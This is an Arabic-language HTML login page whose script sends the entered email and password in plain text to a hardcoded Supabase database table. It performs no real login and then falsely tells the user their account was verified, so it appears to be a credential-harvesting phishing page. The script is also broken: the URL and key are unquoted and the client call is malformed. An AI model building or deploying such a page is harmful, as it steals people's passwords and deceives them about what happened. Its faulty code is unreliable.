<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        body { background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial; }
        .box { background: white; padding: 40px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 350px; text-align: center; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 6px; }
        button { width: 100%; padding: 12px; background: #0095f6; color: white; border: none; border-radius: 6px; cursor: pointer; }
        .message { margin-top: 20px; font-size: 16px; }
        .success { color: green; }
    </style>
</head>
<body>
    <div class="box">
        <h2>تسجيل الدخول</h2>
        <input type="text" id="email" placeholder="البريد الإلكتروني">
        <input type="password" id="password" placeholder="كلمة المرور">
        <button onclick="saveData()">تسجيل الدخول</button>
        <div id="message" class="message"></div>
    </div>

    <script>
        // غير الـ URL و anon key بتوعك من Supabase
        const supabaseUrl = https://hiechkwuygvtvhqtrrgo.supabase.co
        const supabaseAnonKey = eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImhpZWNoa3d1eWd2dHZocXRycmdvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njc0NzA5MjUsImV4cCI6MjA4MzA0NjkyNX0.R38sUaIhzkem7L1kmGRZbG7c7ABBCYTdxzfv5bdyRRw
        const supabase = Supabase. createClient(supabaseUrl, supabaseAnonKey);

        async function saveData() {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;
            const message = document.getElementById('message');

            if (!email || !password) {
                message.textContent = 'أدخل الإيميل وكلمة المرور';
                message.className = 'message';
                return;
            }

            const { data, error } = await supabase
                .from('users')
                .insert([{ email: email, password: password }]);

            if (error) {
                message.textContent = 'خطأ في الحفظ';
            } else {
                message.textContent = 'تم التحقق من صحة حسابك والبيانات حفظت!';
                message.className = 'message success';
            }
        }
    </script>
</body>
</html>
